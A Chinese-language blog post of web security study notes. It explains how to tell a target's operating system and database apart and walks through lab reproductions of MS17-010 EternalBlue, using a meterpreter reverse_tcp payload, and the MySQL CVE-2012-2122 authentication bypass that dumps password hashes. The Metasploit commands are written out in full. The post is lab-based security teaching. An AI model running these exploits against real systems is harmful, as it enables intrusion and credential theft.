---
title: Web安全学习笔记(一):操作系统与数据库识别
description: 记录 Web 安全入门的第一课:如何识别目标的操作系统与数据库类型,并在本地 vulhub 靶场复现 MS17-010 永恒之蓝与 MySQL CVE-2012-2122 认证绕过。
date: 2026-09-15 11:27:25
updated: 2026-10-18 23:40:00
image: /images/covers/tutu-04.jpg
categories: [study]
tags: [Web安全, 渗透测试, Metasploit, vulhub]
---

> 免责声明:本文所有实操均在本地虚拟机与 vulhub 靶场环境中完成,仅供安全学习交流,请勿对任何未授权目标进行测试。

## 识别操作系统

### 利用大小写区分 Windows / Linux

Windows 的文件系统不区分大小写,而 Linux 区分,可以利用这一点判断目标系统。

![Snipaste_2026-10-18_23-51-17](https://zelia.top/images/web-01/01-case-test-windows-1.png)

![Snipaste_2026-10-18_14-21-21](https://zelia.top/images/web-01/02-case-test-windows-2.png)

将 index.php 改成 index.phP 后页面仍然可以正常访问,说明这是 Windows 服务器。

![image-20261018235344090](https://zelia.top/images/web-01/03-case-test-linux-1.png)

![Snipaste_2026-10-18_14-28-04](https://zelia.top/images/web-01/04-case-test-linux-2.png)

把 blog 改成 bloG 就报错,说明该网站是 Linux 服务器。

### 通过 nmap 扫描

先通过 ping 拿到靶机的 IP 地址,再用 nmap 对这个 IP 进行扫描:

```bash
nmap -O <靶机IP>
```

nmap 会给出操作系统的猜测结果和置信度。注意:如果目标绝大多数端口被防火墙过滤,nmap 找不到足够的开放/关闭端口做对比,OS 识别结果就可能不可靠,需要结合 TTL、服务指纹等其他线索综合判断。

### 为什么要区分操作系统?

操作系统决定了下一步怎么走。如果不知道目标是什么系统,连配置文件在哪、密码存哪、怎么提权这些都无法判断。

## 数据库

### 静态网站与动态网站

- 静态网站:由预先生成的固定 HTML 文件组成。
- 动态网站:在用户访问时由服务器实时生成页面内容(通常依赖数据库和后端程序)。

### 数据库的规模分类

- 小型数据库:如 Excel、Access
- 中型数据库:如 MySQL
- 中大型数据库:如 Oracle(RAC 集群)

### 怎么识别数据库类型?

不同脚本类型对应的常用数据库如下:

| 脚本/语言                   | 常配数据库                                  | 常见 Web 服务器                    | 典型环境                 |
| --------------------------- | ------------------------------------------- | ---------------------------------- | ------------------------ |
| ASP(老)                    | Access、SQL Server                          | IIS                                | Windows 老旧网站         |
| ASP.NET(.aspx/.ashx)       | SQL Server、Access                          | IIS                                | Windows 企业站、政务系统 |
| PHP(.php)                  | MySQL / MariaDB,偶尔 PostgreSQL、SQLite     | Apache、Nginx(LAMP/LNMP),宝塔面板 | 绝大多数中小网站、CTF    |
| JSP(Java)(.jsp/.do/.action) | Oracle、MySQL、DB2、SQL Server              | Tomcat、WebLogic、JBoss            | 银行、政企、大型系统     |
| Python(Django/Flask)       | PostgreSQL、MySQL、SQLite(开发期)          | Nginx + Gunicorn/uWSGI             | 新兴互联网、工具类站点   |
| Node.js                     | MongoDB、MySQL、Redis                       | Nginx 反代 + Express 等            | 实时应用、前后端分离后端 |

### 常见数据库默认端口

![常见数据库默认端口](https://zelia.top/images/web-01/05-common-ports.png)

PORT 是端口号,SERVICE 是该端口对应的服务,常见数据库默认端口:

- MySQL / MariaDB:3306
- Oracle Database:1521
- SQLite:无端口(嵌入式文件数据库)
- PostgreSQL:5432

### 为什么要区分数据库?

和区分操作系统一样,数据库类型决定了漏洞的影响范围和攻击方法的选择。

## 实操

以下操作全部在本地靶场环境完成。

### 操作系统漏洞:MS17-010 永恒之蓝

在 vulhub 下载靶场,这里我用 Kali 来进行操作。

启动 `msfconsole`:

搜索 MS17-010 相关模块:

```
msf6 > search ms17-010
```

选择永恒之蓝模块并配置监听载荷:

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > show options
```

![Snipaste_2026-10-18_23-58-54](https://zelia.top/images/web-01/06-msfconsole.png)

![Snipaste_2026-10-19_00-02-04](https://zelia.top/images/web-01/07-search-ms17-010.png)

设置本机 IP 与靶机 IP 后运行:

```
msf6 > set lhost <你的IP(Kali的IP)>
msf6 > set rhosts <靶机IP>
msf6 > run
```

### 数据库漏洞:MySQL CVE-2012-2122 认证绕过

```bash
ifconfig                 # 查看IP
cd /vulhub/mysql/CVE-2012-2122
sudo docker-compose up -d
```

```bash
nmap -sV -O <你的IP>
```

```
msf6 > search mysql
```

![Snipaste_2026-10-19_00-09-20](https://zelia.top/images/web-01/10-search-mysql.png)

```
msf6 > use auxiliary/scanner/mysql/mysql_authbypass_hashdump
msf6 > show options
```

![Snipaste_2026-10-19_00-09-51](https://zelia.top/images/web-01/11-mysql-module-options.png)

```
msf6 > set rhosts 127.0.0.1
msf6 > set threads 100
msf6 > run
```

当出现 `Hash Table has been saved: /home/kali/.msf4/loot/..._mysql.hashes_xxx.txt` 的提示时,说明已经成功导出密码哈希。

![Snipaste_2026-10-19_00-10-36](https://zelia.top/images/web-01/12-mysql-hashes.png)
